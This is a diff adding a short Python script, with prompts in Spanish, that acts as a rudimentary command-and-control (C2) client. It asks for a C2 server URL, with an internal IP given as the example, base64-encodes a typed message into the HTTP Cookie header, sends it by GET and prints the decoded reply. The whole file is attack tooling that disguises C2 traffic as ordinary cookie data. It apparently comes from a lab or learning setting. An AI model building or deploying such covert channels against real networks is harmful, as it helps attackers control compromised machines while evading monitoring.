@@ -1,0 +1,22 @@
+#!/usr/bin/env python3
+
+import requests
+from base64 import b64encode, b64decode
+from urllib.parse import urlparse
+
+def C2(url, data):
+    response = requests.get(url, headers={'Cookie': b64encode(data)})
+    print(b64decode(response.content))
+
+def main():
+    url = input("Ingrese la URL del servidor C2 (ejemplo: http://10.10.10.8:8443): ")
+    parsed_url = urlparse(url)
+    if not parsed_url.scheme:
+        url = "http://" + url
+    message = input("Ingrese el mensaje que desea enviar: ")
+    data = bytes(message, "utf-8")
+    C2(url, data)
+
+if __name__ == "__main__":
+    main()
+
